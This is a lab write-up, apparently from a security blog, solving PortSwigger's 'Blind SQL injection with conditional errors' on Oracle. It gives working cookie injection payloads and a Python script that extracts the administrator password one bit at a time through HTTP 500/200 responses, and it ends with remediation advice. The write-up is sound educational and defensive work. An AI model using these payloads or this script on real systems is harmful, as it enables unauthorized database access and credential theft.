---
title: "Blind SQL injection with conditional errors"
date: 2026-07-01 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, blind, error-based, oracle]
description: "A PortSwigger Web Security Academy lab with no conditional message and no data echoed back — but an unhandled SQL error toggles HTTP 500 vs 200, and a division-by-zero inside a CASE turns that into a one-bit oracle that leaks the admin password."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Blind SQL injection with conditional errors
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) lab is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) on an **Oracle** backend where, unlike the conditional-responses lab, there is no "Welcome back" message to watch and nothing from the query is ever displayed. What gives the attacker an oracle instead is sloppy error handling: when the injected query throws a database error the server returns **HTTP 500**, and when it runs cleanly it returns **HTTP 200**. That status difference is all we need.

> **Blind SQLi series.** Blind injection has three oracle flavours, depending on what the app leaks: a visible/conditional message ([conditional responses]({% post_url 2026-06-30-Blind-SQL-injection-with-conditional-responses %})), a response delay (time-based), or — this lab — an **unhandled error**. The extraction loop is identical; only the true/false signal changes.
{: .prompt-info }

## The technique

The `TrackingId` cookie is concatenated into a query. We can ask the database a yes/no question and make it *crash only when the answer is yes* by dividing by zero inside a CASE expression.

### Step 1 — confirm injection and fingerprint Oracle

A doubled single quote parses cleanly (no error), which already hints the value lands inside a string in SQL:

```
TrackingId=xyz''
```

Then a benign Oracle-only query confirms the engine — Oracle requires every `SELECT` to have a `FROM`, so `FROM dual` is the tell:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

### Step 2 — confirm the error oracle

Force a division-by-zero on the true branch only and compare the status codes:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   ->  HTTP 500
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   ->  HTTP 200
```

True crashes (1/0 runs), false returns the harmless empty string. **500 = TRUE, 200 = FALSE.** That is the one-bit oracle.

### Step 3 — find the password length

Binary-search the length, reading the status code as the answer:

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Adjusting `N` to the boundary gives a length of **20**.

### Step 4 — extract the password character by character

For each position, binary-search the character's ASCII code (Oracle's substring function is `SUBSTR`, not `SUBSTRING`):

```
TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,POS,1))>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

A short script automates the whole thing:

```python
import requests

base = "https://<lab-id>.web-security-academy.net/"
tid  = "<trackingid>"

def err(cond):
    p = f"'||(SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    return requests.get(base, cookies={"TrackingId": tid + p}).status_code == 500

# length
lo, hi = 1, 60
while lo < hi:
    m = (lo + hi) // 2
    if err(f"LENGTH(password)>{m}"):
        lo = m + 1
    else:
        hi = m
n = lo

# each character
pw = ""
for i in range(1, n + 1):
    lo, hi = 32, 126
    while lo < hi:
        m = (lo + hi) // 2
        if err(f"ASCII(SUBSTR(password,{i},1))>{m}"):
            lo = m + 1
        else:
            hi = m
    pw += chr(lo)
print(pw)
```

It recovers the 20-character `administrator` password. Log in with it, and the lab is marked **Solved**.

## Why it works

This is the same idea as boolean and time-based blind SQL injection — ask a yes/no question, read one bit off some observable side-channel — but here the side-channel is an **unhandled error**. Whenever an application lets a database exception bubble up into a distinguishable response (a 500, a stack trace, a different error page), an attacker can deliberately trigger that error on the true branch of a condition and turn it into a data-extraction oracle. Each request leaks one bit; binary search over the ASCII range makes each character cost about 7 requests instead of 95.

Oracle-specific notes worth remembering: string concatenation is `||`, every `SELECT` needs a `FROM` (use `dual` for constant probes), the substring function is `SUBSTR`, and `TO_CHAR(1/0)` is a reliable error trigger. On PostgreSQL the equivalent is casting a CASE result through `1/0`; MySQL doesn't abort on integer division by zero by default, so time-based inference is usually the better fit there.

## The fix

- **Parameterized queries / prepared statements.** Bind the cookie as data so it can never alter the query — this closes the injection regardless of how (or whether) errors are shown.
- **Handle database errors.** Return a generic error response that doesn't change status or content based on the underlying SQL exception, and log the real error server-side only. Removing the 500-vs-200 difference removes the oracle.
- **Least privilege.** Run the database account with only the access the app needs, so a successful injection leaks as little as possible.
